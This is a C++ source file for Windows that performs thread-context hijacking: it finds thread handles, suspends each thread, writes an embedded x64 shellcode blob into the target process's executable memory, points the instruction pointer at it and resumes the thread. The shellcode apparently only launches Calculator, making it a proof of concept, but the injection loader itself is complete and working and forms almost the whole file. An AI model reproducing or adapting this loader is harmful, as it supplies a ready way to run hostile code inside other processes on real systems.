#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <WtsApi32.h>
#include <Psapi.h>
#include <deque>
#include "MapFreeMemoryObjects.h"

using namespace std;

char executableCode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x00";


HANDLE getHandleProcessByPID(DWORD pid) {
    HANDLE hSnapshot;
    PROCESSENTRY32 pEntry;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pEntry.dwSize = sizeof(pEntry);
    HANDLE hProcess = NULL;

    while (Process32Next(hSnapshot, &pEntry)) {
        if (pEntry.th32ProcessID == pid) {
            hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pEntry.th32ProcessID);
            if (hProcess == NULL || pEntry.th32ProcessID == 0) {
                continue;
            }
            else {
                return hProcess;
            }
        }
    }
}

int getPIDbyThread(HANDLE hThread) {
    DWORD threadId = GetThreadId(hThread);
    DWORD processId = GetProcessIdOfThread(hThread);
    return processId;
}


CONTEXT getThreatContext(HANDLE hThread) {
    CONTEXT context;
    context.ContextFlags = CONTEXT_FULL;
    SuspendThread(hThread);
    GetThreadContext(hThread, &context);
    return context;
}

int main() {
    HANDLE hThread;
    CONTEXT context;
    int pid;

	MapMemoryObjects memoryObjects = MapMemoryObjects();
    PSYSTEM_HANDLE_INFORMATION memoryObjectList = memoryObjects.MapMemoryHandlers();
	deque<HANDLE> threads = memoryObjects.FilterThreads(memoryObjectList);

	for (auto thread : threads) {
		hThread = thread;
        context = getThreatContext(hThread);
		pid = getPIDbyThread(hThread);
        HANDLE hProcess = NULL;
        hProcess = getHandleProcessByPID(pid);

        // Allocate memory and write executableCode
        LPVOID mSpace = VirtualAllocEx(hProcess, NULL, sizeof(executableCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(hProcess, mSpace, executableCode, sizeof(executableCode), NULL);

        // Change thread context and resume thread
        context.Rip = (DWORD_PTR)mSpace;
        SetThreadContext(hThread, &context);
        ResumeThread(hThread);

		// check if a calculator process is running, if so break the loop because the shellcode was successfuly executed
        if (FindWindowA(NULL, "Calculator")) {
            break;
        }
        CloseHandle(hThread);
	}

   
}